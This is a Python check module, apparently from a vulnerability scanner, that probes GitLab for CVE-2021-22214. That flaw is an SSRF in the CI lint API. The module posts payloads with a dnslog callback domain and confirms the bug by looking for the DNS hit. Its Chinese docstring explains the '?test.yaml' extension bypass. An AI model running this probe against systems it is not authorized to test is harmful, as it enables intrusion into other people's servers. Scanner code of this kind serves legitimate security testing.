#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from thirdparty import requests
from time import sleep

def cve_2021_22214_scan(self, url):
    ''' Gitlab的CI lint API用于验证提供给gitlab ci的配置文件是否是yaml格式, 
        其include操作支持remote选项, 用于获取远端的yaml, 因此在此处将remote参数设置为本地回环地址, 
        同时由于后端会检查最后扩展名, 加上?test.yaml 即可绕过
    '''
    sessid = '35c4b2b338754840369c3b20a2847f0a'

    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'SSRF'
    vul_info['vul_id'] = 'CVE-2021-22214'
    vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {
        'Content-Type': 'application/json'
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2021_22214_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path']
        data = payload['data'].replace('DNSdomain', dns_domain)
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG


            sleep(3)
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
